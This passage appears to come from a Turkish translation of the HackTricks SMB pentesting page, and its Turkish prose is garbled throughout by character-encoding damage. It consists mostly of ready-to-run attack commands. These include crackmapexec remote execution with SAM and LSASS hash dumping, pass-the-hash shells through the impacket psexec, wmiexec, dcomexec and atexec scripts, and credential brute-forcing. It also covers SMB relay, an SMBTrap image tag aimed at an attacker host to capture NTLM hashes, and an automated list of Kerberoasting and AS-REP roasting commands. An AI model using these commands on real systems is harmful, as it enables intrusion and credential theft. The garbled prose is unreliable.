| `directory mask = 0777`     | Yeni oluÅŸturulan dizinlere hangi izinler atanmalÄ±dÄ±r?                |
| `logon script = script.sh`  | KullanÄ±cÄ±nÄ±n oturum aÃ§masÄ±nda hangi betik Ã§alÄ±ÅŸtÄ±rÄ±lmalÄ±dÄ±r?         |
| `magic script = script.sh`  | Betik kapatÄ±ldÄ±ÄŸÄ±nda hangi betik Ã§alÄ±ÅŸtÄ±rÄ±lmalÄ±dÄ±r?                 |
| `magic output = script.out` | BÃ¼yÃ¼lÃ¼ betiÄŸin Ã§Ä±ktÄ±sÄ± nereye kaydedilmelidir?                       |

`smbstatus` komutu, **sunucu** ve **kimin baÄŸlÄ± olduÄŸu** hakkÄ±nda bilgi verir.

## Kerberos ile Kimlik DoÄŸrulama

**smbclient** ve **rpcclient** araÃ§larÄ±nÄ± kullanarak **kerberos** Ã¼zerinde **kimlik doÄŸrulamasÄ±** yapabilirsiniz:
```bash
smbclient --kerberos //ws01win10.domain.com/C$
rpcclient -k ws01win10.domain.com
```
## **KomutlarÄ± YÃ¼rÃ¼tme**

### **crackmapexec**

crackmapexec, **mmcexec, smbexec, atexec, wmiexec**'i **kÃ¶tÃ¼ye kullanarak** komutlarÄ± yÃ¼rÃ¼tebilir. VarsayÄ±lan yÃ¶ntem olan **wmiexec**'i kullanmak istediÄŸinizi belirtebilirsiniz. `--exec-method` parametresiyle hangi seÃ§eneÄŸi kullanmak istediÄŸinizi belirtebilirsiniz:
```bash
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```
### [**psexec**](../windows-hardening/ntlm/psexec-and-winexec.md)**/**[**smbexec**](../windows-hardening/ntlm/smbexec.md)

Her iki seÃ§enek de kurban makinede _\pipe\svcctl_ Ã¼zerinden SMB aracÄ±lÄ±ÄŸÄ±yla yeni bir hizmet oluÅŸturacak ve onu bir ÅŸeyi yÃ¼rÃ¼tmek iÃ§in kullanacak (**psexec**, yÃ¼rÃ¼tÃ¼lebilir bir dosyayÄ± ADMIN$ paylaÅŸÄ±mÄ±na yÃ¼kleyecek ve **smbexec**, cmd.exe/powershell.exe'ye iÅŸaret edecek ve argÃ¼manlara payloadu ekleyecek --**dosyasÄ±z teknik--**-).\
[psexec](../windows-hardening/ntlm/psexec-and-winexec.md) ve [smbexec](../windows-hardening/ntlm/smbexec.md) hakkÄ±nda **daha fazla bilgi**.\
Kali'de /usr/share/doc/python3-impacket/examples/ konumunda bulunur.
```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
```
**-k** parametresini kullanarak, **NTLM** yerine **kerberos** ile kimlik doÄŸrulamasÄ± yapabilirsiniz.

### [wmiexec](../windows-hardening/ntlm/wmicexec.md)/dcomexec

**Port 135** Ã¼zerinden DCOM kullanarak diske dokunmadan veya yeni bir servis Ã§alÄ±ÅŸtÄ±rmadan gizlice bir komut kabuÄŸu Ã§alÄ±ÅŸtÄ±rÄ±n.\
**Kali** Ã¼zerinde /usr/share/doc/python3-impacket/examples/ dizininde bulunur.
```bash
#If no password is provided, it will be prompted
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
**Kerberos** yerine **NTLM** yerine geÃ§mek iÃ§in **-k** parametresini kullanarak kimlik doÄŸrulamasÄ± yapabilirsiniz.
```bash
#If no password is provided, it will be prompted
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
### [AtExec](../windows-hardening/ntlm/atexec.md)

GÃ¶rev ZamanlayÄ±cÄ±sÄ± aracÄ±lÄ±ÄŸÄ±yla komutlarÄ± yÃ¼rÃ¼tme (_\pipe\atsvc_ Ã¼zerinden SMB kullanarak).\
**kali** Ã¼zerinde /usr/share/doc/python3-impacket/examples/ konumunda bulunur.
```bash
./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```
## Impacket referansÄ±

[https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)

## **KullanÄ±cÄ± kimlik bilgilerini kaba kuvvet ile deneme**

**Bu Ã¶nerilmez, maksimum izin verilen deneme sayÄ±sÄ±nÄ± aÅŸarsanÄ±z bir hesabÄ± engelleyebilirsiniz**
```bash
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name
```
## SMB iletim saldÄ±rÄ±sÄ±

Bu saldÄ±rÄ±, Responder aracÄ±nÄ± kullanarak bir iÃ§ aÄŸda SMB kimlik doÄŸrulama oturumlarÄ±nÄ± yakalar ve bunlarÄ± bir hedef makineye iletir. Kimlik doÄŸrulama oturumu baÅŸarÄ±lÄ± ise, otomatik olarak bir sistem kabuÄŸuna geÃ§ersiniz.\
[**Bu saldÄ±rÄ± hakkÄ±nda daha fazla bilgi burada.**](../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

## SMB-Trap

Windows kÃ¼tÃ¼phanesi URLMon.dll, bir sayfanÄ±n SMB Ã¼zerinden bazÄ± iÃ§eriklere eriÅŸmeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda otomatik olarak ana bilgisayara kimlik doÄŸrulama yapmaya Ã§alÄ±ÅŸÄ±r, Ã¶rneÄŸin: `img src="\\10.10.10.10\path\image.jpg"`

Bu, aÅŸaÄŸÄ±daki iÅŸlevlerle gerÃ§ekleÅŸir:

* URLDownloadToFile
* URLDownloadToCache
* URLOpenStream
* URLOpenBlockingStream

BazÄ± tarayÄ±cÄ±lar ve araÃ§lar (Ã¶rneÄŸin Skype) tarafÄ±ndan kullanÄ±lÄ±r.

![Kaynak: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (93).png>)

### MitMf kullanarak SMBTrap

![Kaynak: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (94).png>)

## NTLM HÄ±rsÄ±zlÄ±ÄŸÄ±

SMB Tuzaklama ile benzer ÅŸekilde, hedef sisteme kÃ¶tÃ¼ amaÃ§lÄ± dosyalar yerleÅŸtirerek (Ã¶rneÄŸin SMB aracÄ±lÄ±ÄŸÄ±yla) SMB kimlik doÄŸrulama denemesi yapÄ±labilir ve bu sayede NetNTLMv2 karmaÅŸasÄ±, Responder gibi bir araÃ§la ele geÃ§irilebilir. KarmaÅŸa daha sonra Ã§evrimdÄ±ÅŸÄ± olarak kÄ±rÄ±labilir veya [SMB iletim saldÄ±rÄ±sÄ±nda](pentesting-smb.md#smb-relay-attack) kullanÄ±labilir.

[GÃ¶rÃ¼ntÃ¼le: ntlm\_theft](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#ntlm\_theft)

## HackTricks Otomatik KomutlarÄ±
```
Protocol_Name: SMB    #Protocol Abbreviation if there is one.
Port_Number:  137,138,139     #Comma separated if there is more than one.
Protocol_Description: Server Message Block         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMB
Note: |
While Port 139 is known technically as â€˜NBT over IPâ€™, Port 445 is â€˜SMB over IPâ€™. SMB stands for â€˜Server Message Blocksâ€™. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

#These are the commands I run in order every time I see an open SMB port

With No Creds
nbtscan {IP}
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
rpcclient {IP}
rpcclient -U "" {IP}
crackmapexec smb {IP}
crackmapexec smb {IP} --pass-pol -u "" -p ""
crackmapexec smb {IP} --pass-pol -u "guest" -p ""
GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
getArch.py -target {IP}

With Creds
smbmap -H {IP} -u {Username} -p {Password}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
crackmapexec smb {IP} -u {Username} -p {Password} --shares
GetADUsers.py {Domain_Name}/{Username}:{Password} -all
GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

https://book.hacktricks.xyz/pentesting/pentesting-smb

Entry_2:
Name: Enum4Linux
Description: General SMB Scan
Command: enum4linux -a {IP}

Entry_3:
Name: Nmap SMB Scan 1
Description: SMB Vuln Scan With Nmap
Command: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}

Entry_4:
Name: Nmap Smb Scan 2
Description: SMB Vuln Scan With Nmap (Less Specific)
Command: nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}

Entry_5:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb

Entry_6:
Name: SMB/SMB2 139/445 consolesless mfs enumeration
Description: SMB/SMB2 139/445  enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'

```
<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
